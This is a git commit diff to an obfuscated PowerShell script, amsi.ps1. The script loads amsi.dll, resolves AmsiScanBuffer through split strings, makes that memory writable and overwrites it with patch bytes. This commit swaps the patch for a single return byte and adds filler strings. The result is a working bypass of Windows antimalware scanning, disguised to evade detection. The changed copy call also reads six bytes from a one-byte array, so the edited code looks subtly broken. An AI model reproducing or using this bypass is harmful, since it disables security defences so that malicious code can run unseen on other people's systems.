fb5fdb9aceec2a065b434f8df8ebb5359bbf9827
Alex Cucea <43235041+cuceaalexandru@users.noreply.github.com>
2020-10-01 20:13:42 +0300

    Update amsi.ps1

--- amsi.ps1
+++ amsi.ps1
@@ -22,7 +22,8 @@ $IIl3wcjXoWgkc4 = [y2UtAQYQI4rY1O]::LoadLibrary("am" + "s" + "i" + "." + "d" + "
 $X5ahZ4sP0qdNpU = [y2UtAQYQI4rY1O]::GetProcAddress($IIl3wcjXoWgkc4, "A" + "m" + "s" + "i" + "S" + "ca" + "n" + "B" + "u" + "ff" + "e" + "r")
 $ToXS2D2BVoxcuD = 0
 [y2UtAQYQI4rY1O]::VirtualProtect($X5ahZ4sP0qdNpU, [uint32]5, 0x40, [ref]$p)
-$RuFe2syUaHbsxd = 51524520
-$KC129iTM0m0q6A = [Byte[]] ( 0x00, 0x07, 0x80, 0xC3)
+$RuFe2syUaHbsxd = 'test'
+$KC129iTM0m0q6A = [Byte[]] ( 0xC3)
+$string = 'ababacaascds'
 [System.Runtime.InteropServices.Marshal]::Copy($KC129iTM0m0q6A, 0, $X5ahZ4sP0qdNpU, 6)
 }
